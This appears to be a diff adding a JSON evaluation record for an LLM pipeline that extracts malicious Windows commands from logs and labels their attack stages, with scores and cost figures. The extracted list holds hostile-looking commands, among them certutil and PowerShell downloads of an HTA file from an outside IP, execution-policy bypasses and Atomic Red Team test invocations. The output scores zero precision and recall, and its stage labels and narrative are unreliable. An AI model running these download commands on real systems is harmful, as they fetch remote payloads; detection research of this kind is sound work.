@@ -1,0 +1,171 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/kghrxueb/kghrxueb.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/vlhyhpfm/vlhyhpfm.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/qddpxykz/qddpxykz.cmdline\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/wrswtpbm/wrswtpbm.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/hyjqbebc/hyjqbebc.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/pktcbogp/pktcbogp.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/nrzolbxh/nrzolbxh.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temporal/mwrtsycw/mwrtsycw.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/3bhro2fa/3bhro2fa.cmdline\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/j5pehrxm/j5pehrxm.cmdline\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temporal/lmnkjtfj/lmnkjtfj.cmdline\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users/Administrator/AppData/Local/Temp/gvirfxko/gvirfxko.cmdline\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220 -TestNumbers 1\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220 -TestNumbers 1\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220 -TestNumbers 1\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "(gwmi -list Win32_ShadowCopy).Create('\\\\.\\\\C\\\\', 'ClientAccessible')",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220 -TestNumbers 1\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220 -TestNumbers 1\"",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attackers have established persistence through several means, such as creating scheduled tasks, modifying registry keys, and altering system settings. They also have been collecting information about the target system using tools like CertUtil and PowerShell scripts. Additionally, they have been evading detection by using techniques like encoding scripts and hiding malware in legitimate-looking files. The attackers have made various connections to IP addresses associated with known malicious domains.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 169023,
+      "completion_tokens": 4321,
+      "total_tokens": 173344,
+      "wall_clock_s": 39.683,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 30,
+      "fn": 23
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 30,
+      "fn": 23,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 169023,
+      "completion_tokens": 4321,
+      "total_tokens": 173344,
+      "wall_clock_s": 39.683,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
